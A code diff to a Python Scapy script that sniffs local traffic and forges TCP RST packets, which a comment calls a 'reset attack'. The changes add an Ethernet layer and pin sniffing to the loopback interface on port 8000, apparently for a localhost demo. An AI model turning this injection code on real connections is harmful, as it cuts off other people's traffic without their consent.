@@ -98,7 +98,7 @@ def send_reset(iface, seq_jitter=0, ignore_syn=True):
 
         rst_seq = ack + jitter
         #p = IP(src=dst_ip, dst=src_ip) / TCP(sport=dst_port, dport=src_port, flags="R", window=DEFAULT_WINDOW_SIZE, seq=rst_seq)
-        p = IP(dst=dst_ip) / TCP(dport=dst_port, flags="R", window=DEFAULT_WINDOW_SIZE, seq=rst_seq)
+        p = Ether() / IP(dst=dst_ip) / TCP(dport=dst_port, flags="R", window=DEFAULT_WINDOW_SIZE, seq=rst_seq)
 
         log(
             "Sending RST packet...",
@@ -129,12 +129,13 @@ if __name__ == "__main__":
     ]
 
     iface = local_ifaces[0]
+    print(iface)
 
     localhost_server_port = 8000
 
     log("Starting sniff...")
     t = sniff(
-        iface=iface,
+        iface='lo0',
         count=50,
         # NOTE: uncomment `send_reset` to run the reset attack instead of
         # simply logging the packet.
